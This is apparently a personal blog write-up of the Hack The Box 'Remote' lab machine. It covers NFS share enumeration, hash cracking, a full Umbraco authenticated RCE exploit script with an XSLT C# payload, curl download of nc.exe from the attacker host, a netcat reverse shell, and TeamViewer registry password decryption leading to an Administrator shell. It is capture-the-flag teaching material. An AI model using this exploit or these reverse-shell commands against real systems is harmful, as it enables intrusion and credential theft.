---
layout: post
title:  "Hack The Box - Remote"
date:   2020-09-06 14:23:00 +0800
categories: hackthebox windows nfs umbraco teamviewer
---

From this write-up, I probably learnt that it is best to get the screenshots and command outputs immediately or while you pwn the box as your exploits may not work in the future. However, it did teach me not to blindly rely on the online scripts to work perfectly everytime and I learnt how to fix them :)

![](/assets/images/remote.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

{% highlight bash %}
$ echo "10.10.10.180 remote.htb" >> /etc/hosts
{% endhighlight %}

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
{% highlight bash %}
$ nmap -sV -sT -sC remote.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-22 05:30 EDT
Nmap scan report for remote.htb (10.10.10.180)
Host is up (0.27s latency).
Not shown: 992 closed ports
PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open     rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds?
1119/tcp filtered bnetgame
2049/tcp open     mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m12s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-22T09:34:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 268.43 seconds

{% endhighlight %}

# Enumeration (1)

Even though Anonymous FTP login was allowed, there was no files on the `ftp` service on port `21` :( Moving on, we see a `http` service running port `80` so lets check that out.

![](/assets/images/remote1.png)

This website seems like its based on a web template but let's continue crawling around...

`http://remote.htb/contact/`:

![](/assets/images/remote2.png)

On this page was this button that brings me to a login page of a content management system (CMS) called `Umbraco`!

![](/assets/images/remote3.png)

We don't have credentials to login with but I did find an [exploit](https://github.com/noraj/Umbraco-RCE) we can possibly use on this CMS. However, this exploit require us to be authenticated but we can keep this exploit for later on.

Going back to the scan results, we see a large chuck of `rpcbind` information from port `111`, but below that we see a `mountd` service running on port `2049`

Using `showmount`, we can see what `NFS` (Network File Share) shares are available on the service.

{% highlight bash %}
$ showmount -e remote.htb
Export list for remote.htb:
/site_backups (everyone)
{% endhighlight %}

Lets try mounting it on our machine:

{% highlight bash %}
$ mkdir /mnt/nfs
$ mount -t nfs -o vers=3 remote.htb:/site_backups /mnt/nfs
{% endhighlight %}

No output but I guess it worked? Lets see whats inside!

{% highlight bash %}
$ cd /mnt/nfs
$ ls -al
total 123
drwx------ 2 4294967294 4294967294  4096 Aug 15 11:12 .
drwxr-xr-x 3 root       root        4096 Aug 16 15:15 ..
drwx------ 2 4294967294 4294967294    64 Feb 20 12:16 App_Browsers
drwx------ 2 4294967294 4294967294  4096 Feb 20 12:17 App_Data
drwx------ 2 4294967294 4294967294  4096 Feb 20 12:16 App_Plugins
drwx------ 2 4294967294 4294967294    64 Feb 20 12:16 aspnet_client
drwx------ 2 4294967294 4294967294 49152 Feb 20 12:16 bin
drwx------ 2 4294967294 4294967294  8192 Feb 20 12:16 Config
drwx------ 2 4294967294 4294967294    64 Feb 20 12:16 css
-rwx------ 1 4294967294 4294967294   152 Nov  1  2018 default.aspx
-rwx------ 1 4294967294 4294967294    89 Nov  1  2018 Global.asax
drwx------ 2 4294967294 4294967294  4096 Feb 20 12:16 Media
drwx------ 2 4294967294 4294967294    64 Feb 20 12:16 scripts
drwx------ 2 4294967294 4294967294  8192 Feb 20 12:16 Umbraco
drwx------ 2 4294967294 4294967294  4096 Feb 20 12:16 Umbraco_Client
drwx------ 2 4294967294 4294967294  4096 Feb 20 12:16 Views
-rwx------ 1 4294967294 4294967294 28539 Feb 20 00:57 Web.config
{% endhighlight %}

This seem like a folder containing the contents of the `Umbraco` CMS. Since this files and folders could be a backup of the current `Umbraco` instance that is running, lets see if we can find any hard-coded configuration or credentials we can use. 

Digging around, I found a `Umbraco.sdf` under `App_Data`. Searching online, it says that this file was an `SQL` file containing the contents of the `Umbraco` CMS! Nice! However, this file is in binary but we can run `strings` on it and eyeball for information.

{% highlight bash %}
$ strings Umbraco.sdf | less
...
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
...
{% endhighlight %}

Alright, we see what seems to be login information such as the username, email, password hashes as well as the hash algorithm used. We can see 2 users: `admin` and `ssmith`, but hash of `admin@htb.local` is in `SHA1` while the hash of `ssmith@htb.local` is in `HMACSHA256`. `HMACSHA256` needs a key to be cracked but we are not sure how it was implemented in this system but we can definitely crack the `SHA1` hash online.

`https://crackstation.net/`:

![](/assets/images/remote4.png)

Lets check if `baconandcheese` is still being used for the `admin@htb.local` account.

![](/assets/images/remote5.png)

After pressing "Login", nothing appeared on webpage but we know that the login was successful. Remember the [exploit](https://github.com/noraj/Umbraco-RCE) we found just now? Lets see if this exploit works with our credentials that we found.

# Exploitation

{% highlight bash %}
$ python umbraco.py -u 'admin@htb.local' -p 'baconandcheese' -i http://remote.htb -c cmd.exe -a "/c whoami"
k (most recent call last):
  File "umbraco3.py", line 53, in <module>
    VIEWSTATE = soup.find(id="__VIEWSTATE")['value']
{% endhighlight %}

When I first pwned this box, this exploit was working fine! Fortunately, I was able to debug and realised that the new cookies set after successful logon were not being saved properly, so I tweaked the script a little:

{% highlight python %}
# Exploit Title: Umbraco CMS - Authenticated Remote Code Execution 
# Date: 2020-03-28
# Exploit Author: Alexandre ZANNI (noraj)
# Based on: https://www.exploit-db.com/exploits/46153
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# Example: python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig

import requests
import re
import argparse
from http.cookies import SimpleCookie

from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(prog='exploit.py',
    description='Umbraco authenticated RCE',
    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))
parser.add_argument('-u', '--user', metavar='USER', type=str,
    required=True, dest='user', help='username / email')
parser.add_argument('-p', '--password', metavar='PASS', type=str,
    required=True, dest='password', help='password')
parser.add_argument('-i', '--host', metavar='URL', type=str, required=True,
    dest='url', help='root URL')
parser.add_argument('-c', '--command', metavar='CMD', type=str, required=True,
    dest='command', help='command')
parser.add_argument('-a', '--arguments', metavar='ARGS', type=str, required=False,
    dest='arguments', help='arguments', default='')
args = parser.parse_args()

# Payload
payload = """\
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>
""" % (args.arguments, args.command)

login = args.user
password = args.password
host = args.url

# Process Login
url_login = host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"
loginfo = { "username": login, "password": password}
s = requests.session()

# START OF MODIFIED SECTION
# r2 = s.post(url_login,json=loginfo)
r2 = requests.post(url_login,json=loginfo)
cookie = SimpleCookie()
cookie.load(r2.headers["Set-Cookie"])

for key,value in cookie.items():
    cookie_obj = requests.cookies.create_cookie(name=key,value=value.value)
    s.cookies.set_cookie(cookie_obj)
# END OF MODIFIED SECTION


# Go to vulnerable web page
url_xslt = host + "/umbraco/developer/Xslt/xsltVisualize.aspx"
r3 = s.get(url_xslt)


soup = BeautifulSoup(r3.text, 'html.parser')
VIEWSTATE = soup.find(id="__VIEWSTATE")['value']
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value']
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']
headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}
data = { "__EVENTTARGET": "", "__EVENTARGUMENT": "", "__VIEWSTATE": VIEWSTATE,
    "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
    "ctl00$body$xsltSelection": payload,
    "ctl00$body$contentPicker$ContentIdValue": "",
    "ctl00$body$visualizeDo": "Visualize+XSLT" }

# Launch the attack
r4 = s.post(url_xslt, data=data, headers=headers)

# print(r4.text)
# Filter output
soup = BeautifulSoup(r4.text, 'html.parser')
CMDOUTPUT = soup.find(id="result").getText()
print(CMDOUTPUT)
{% endhighlight %}

Now, lets test it out.

{% highlight bash %}
$ python umbraco.py -u 'admin@htb.local' -p 'baconandcheese' -i http://remote.htb -c cmd.exe -a "/c whoami"
iis apppool\defaultapppool

{% endhighlight %}

With RCE on the box, we can now upload our `nc.exe` to it and establish a reverse shell.

{% highlight bash %}
$ python umbraco.py -u 'admin@htb.local' -p 'baconandcheese' -i http://remote.htb -c cmd.exe -a "/c mkdir C:\\\\tmp"

$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

$ python umbraco.py -u 'admin@htb.local' -p 'baconandcheese' -i http://remote.htb -c cmd.exe -a "/c curl http://10.10.XX.XX/nc.exe > C:\\\\tmp\\\\nc.exe"

$ nc -lvnp 1337
istening on [any] 1337 ...

$ python umbraco.py -u 'admin@htb.local' -p 'baconandcheese' -i http://remote.htb -c cmd.exe -a "/c C:\\\\tmp\\\\nc.exe -e cmd.exe 10.10.XX.XX 1337"
{% endhighlight %}

On our `nc` listener`, we catch our reverse shell.
{% highlight raw %}
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.180] 49708
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
{% endhighlight %}

# user.txt 

As the current user did not have a home directory, I had to resort to using `where` to find it.

{% highlight raw %}
c:\windows\system32\inetsrv> where /R C:\ user.txt
C:\Users\Public\user.txt
c:\windows\system32\inetsrv> type C:\Users\Public\user.txt
cf70XXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

# Enumeration (2)

Lets check whats installed on the system.

{% highlight raw %}
c:\windows\system32\inetsrv> dir "C:\Program Files"
 Volume in drive C has no label.
 Volume Serial Number is BE23-EB3E

 Directory of C:\Program Files

02/23/2020  03:19 PM    <DIR>          .
02/23/2020  03:19 PM    <DIR>          ..
02/19/2020  04:04 PM    <DIR>          Common Files
09/15/2018  05:06 AM    <DIR>          internet explorer
02/23/2020  03:16 PM    <DIR>          Microsoft SQL Server
02/19/2020  04:11 PM    <DIR>          MSBuild
02/19/2020  04:11 PM    <DIR>          Reference Assemblies
02/19/2020  04:04 PM    <DIR>          VMware
02/20/2020  07:46 AM    <DIR>          Windows Defender
09/15/2018  05:05 AM    <DIR>          Windows Defender Advanced Threat Protection
09/15/2018  03:19 AM    <DIR>          Windows Mail
10/29/2018  06:39 PM    <DIR>          Windows Media Player
09/15/2018  03:19 AM    <DIR>          Windows Multimedia Platform
09/15/2018  03:28 AM    <DIR>          windows nt
10/29/2018  06:39 PM    <DIR>          Windows Photo Viewer
09/15/2018  03:19 AM    <DIR>          Windows Portable Devices
09/15/2018  03:19 AM    <DIR>          Windows Security
09/15/2018  03:19 AM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              18 Dir(s)  19,394,420,736 bytes free

c:\windows\system32\inetsrv> dir "C:\Program Files (x86)"
 Volume in drive C has no label.
 Volume Serial Number is BE23-EB3E

 Directory of C:\Program Files (x86)

02/23/2020  03:19 PM    <DIR>          .
02/23/2020  03:19 PM    <DIR>          ..
09/15/2018  03:28 AM    <DIR>          Common Files
09/15/2018  05:06 AM    <DIR>          Internet Explorer
02/23/2020  03:19 PM    <DIR>          Microsoft SQL Server
02/23/2020  03:15 PM    <DIR>          Microsoft.NET
02/19/2020  04:11 PM    <DIR>          MSBuild
02/19/2020  04:11 PM    <DIR>          Reference Assemblies
02/20/2020  03:14 AM    <DIR>          TeamViewer
09/15/2018  05:05 AM    <DIR>          Windows Defender
09/15/2018  03:19 AM    <DIR>          Windows Mail
10/29/2018  06:39 PM    <DIR>          Windows Media Player
09/15/2018  03:19 AM    <DIR>          Windows Multimedia Platform
09/15/2018  03:28 AM    <DIR>          windows nt
10/29/2018  06:39 PM    <DIR>          Windows Photo Viewer
09/15/2018  03:19 AM    <DIR>          Windows Portable Devices
09/15/2018  03:19 AM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              17 Dir(s)  19,394,396,160 bytes free
{% endhighlight %}

"TeamViewer"? This definitely seem worth looking into. Maybe there are saved passwords? I couldn't find any config files containing saved passwords so another location that stores configs is probably the registry.

{% highlight raw %}
c:\windows\system32\inetsrv> reg query HKLM /s /k /f "TeamViewer"
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\TeamViewer 7
HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TeamViewerConfiguration
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\TeamViewerSession
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TeamViewer7
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\TeamViewer7
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TeamViewer7
End of search: 7 match(es) found
{% endhighlight %}

`HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer` seems promising so lets check that out.

{% highlight raw %}
c:\windows\system32\inetsrv> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer" /s
...
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
...
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
...
{% endhighlight %}

Seems like I was right! Using this script from this [link](https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0), I was able to retrieve the decrypted password.

{% highlight bash %}
$ python3 tv.py 

This is a quick and dirty Teamviewer password decrypter basis wonderful post by @whynotsecurity.
Read this blogpost if you haven't already : https://whynotsecurity.com/blog/teamviewer
 
Please check below mentioned registry values and enter its value manually without spaces.
"SecurityPasswordAES" OR "OptionsPasswordAES" OR "SecurityPasswordExported" OR "PermanentPassword"

Enter output from registry without spaces : FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
Decrypted password is :  !R3m0te!
{% endhighlight %}

# root.txt

With `!R3m0te!`, lets check if we can get into the `Administrator`'s account.

{% highlight bash %}
$ python psexec.py 'Administrator:!R3m0te!@remote.htb'
Impacket v0.9.22.dev1+20200713.100928.1e84ad60 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on remote.htb.....
[*] Found writable share ADMIN$
[*] Uploading file FNFPcETB.exe
[*] Opening SVCManager on remote.htb.....
[*] Creating service xGXs on remote.htb.....
[*] Starting service xGXs.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
baceXXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}


Rooted ! Thank you for reading and look forward for more writeups and articles !